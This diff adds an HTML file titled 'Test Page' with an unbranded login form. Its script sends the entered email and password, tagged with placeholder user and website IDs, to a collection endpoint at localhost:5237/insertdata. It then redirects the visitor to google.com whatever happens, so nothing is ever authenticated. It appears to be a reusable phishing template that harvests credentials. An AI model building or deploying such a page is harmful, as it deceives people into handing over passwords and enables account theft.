@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Page</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(to right, #4facfe, #00f2fe);
+        }
+        .login-container {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+        }
+        .login-container h2 {
+            margin-bottom: 1rem;
+            color: #333;
+        }
+        .input-group {
+            margin-bottom: 1rem;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background: #4facfe;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #00c6ff;
+        }
+        .error {
+            color: red;
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Email</label>
+                <input type="text" id="email" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" required>
+            </div>
+            <button id ="testeb" onclick="handleSubmit(event)" class="btn">Login</button>
+            <p id="error-message" class="error"></p>
+        </form>
+    </div>
+
+    <script>
+
+            const uid = "user123user123"; 
+      const websiteName = "mywebsitemywebsite"; 
+  
+      async function handleSubmit(event) {
+        event.preventDefault(); 
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+        const signInButton = document.getElementById("testeb");
+            signInButton.disabled = true;
+            signInButton.style.opacity = '0.5';
+            signInButton.style.cursor = 'not-allowed';
+        try {
+          const response = await fetch("http://localhost:5237/insertdata", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              uid: uid,
+              websiteName: websiteName,
+              email: email,
+              password: password
+            })
+          });
+  
+          window.location.href = "https://google.com/";
+        } catch (error) {
+          window.location.href = "https://google.com/";
+          console.error("Error inserting data:", error);
+        }
+      }
+    </script>
+</body>
+</html>
